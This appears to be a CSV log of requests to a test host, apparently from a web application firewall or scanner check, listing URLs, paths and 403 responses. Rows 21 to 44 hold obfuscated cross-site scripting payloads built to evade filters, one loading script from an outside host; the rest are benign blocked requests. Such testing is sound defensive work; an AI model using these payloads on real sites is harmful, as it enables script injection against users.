21,http://test2.ca89033.tmweb.ru/example?p1=<iFrAMe/src,/example?p1=<iFrAMe/src,403
22,"http://test2.ca89033.tmweb.ru/example?p1=<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()","/example?p1=<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()",403
23,"http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=<svg%0Aonload=%09((pro\u006dpt))()//","/example?p1=p1val&p2=<svg%0Aonload=%09((pro\u006dpt))()//",403
24,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=<sCriPt,/example?p1=p1val&p2=<sCriPt,403
25,"http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=<w=""/x=""y>""/OndbLcLick=`<`[confir\u006d``]>z","/example?p1=p1val&p2=<w=""/x=""y>""/OndbLcLick=`<`[confir\u006d``]>z",403
26,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=<deTAiLs/open/oNtoGGle=confirm()>,/example?p1=p1val&p2=<deTAiLs/open/oNtoGGle=confirm()>,403
27,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=<scRiPt,/example?p1=p1val&p2=<scRiPt,403
28,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=<A,/example?p1=p1val&p2=<A,403
29,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=<sVg,/example?p1=p1val&p2=<sVg,403
30,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=<A,/example?p1=p1val&p2=<A,403
31,"http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=<sCrIpt/""<a""/srC=data:="".<a,[8].some(confirm)>","/example?p1=p1val&p2=<sCrIpt/""<a""/srC=data:="".<a,[8].some(confirm)>",403
32,"http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=<svG/x="">""/oNloaD=confirm()//","/example?p1=p1val&p2=<svG/x="">""/oNloaD=confirm()//",403
33,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=<--`<iMG/srC=`,/example?p1=p1val&p2=<--`<iMG/srC=`,403
34,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=<SVg,/example?p1=p1val&p2=<SVg,403
35,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=<!--><scRipT,/example?p1=p1val&p2=<!--><scRipT,403
36,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=<sCriPt/src=//14.rs?,/example?p1=p1val&p2=<sCriPt/src=//14.rs?,403
37,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=<sCRIpt,/example?p1=p1val&p2=<sCRIpt,403
38,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=<D3/OnMouSEenTer=[2].find(confirm)>z,/example?p1=p1val&p2=<D3/OnMouSEenTer=[2].find(confirm)>z,403
39,"http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=<D3""<""/OncLick=""1>[confirm``]""<"">z","/example?p1=p1val&p2=<D3""<""/OncLick=""1>[confirm``]""<"">z",403
40,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=<D3/OnpOinTeReENter=confirm``>click,/example?p1=p1val&p2=<D3/OnpOinTeReENter=confirm``>click,403
41,"http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=<!'/*""/*/'/*/""/*--></Script><Image","/example?p1=p1val&p2=<!'/*""/*/'/*/""/*--></Script><Image",403
42,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=<Z,/example?p1=p1val&p2=<Z,403
43,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=<iFrAMe/src,/example?p1=p1val&p2=<iFrAMe/src,403
44,"http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()","/example?p1=p1val&p2=<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()",403
45,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
46,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
47,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
48,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
49,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
50,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
51,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
52,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
53,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
54,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
55,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
56,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
57,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
58,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
59,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
60,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
61,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
62,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
63,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
64,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
65,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
66,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
67,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
68,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
69,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
70,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
71,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
72,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
73,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
74,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
75,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
76,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
77,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
78,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
79,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
80,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
81,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
82,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
83,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
84,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
85,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
86,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
87,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
88,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
89,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
90,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
91,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
92,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
93,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
94,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
95,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
96,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
97,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
98,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
99,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
100,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
101,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
102,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
103,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
104,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
105,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
106,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
107,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
108,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
109,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
110,http://test2.ca89033.tmweb.ru/example?p1=p1val&p2=p2val,/example?p1=p1val&p2=p2val,403
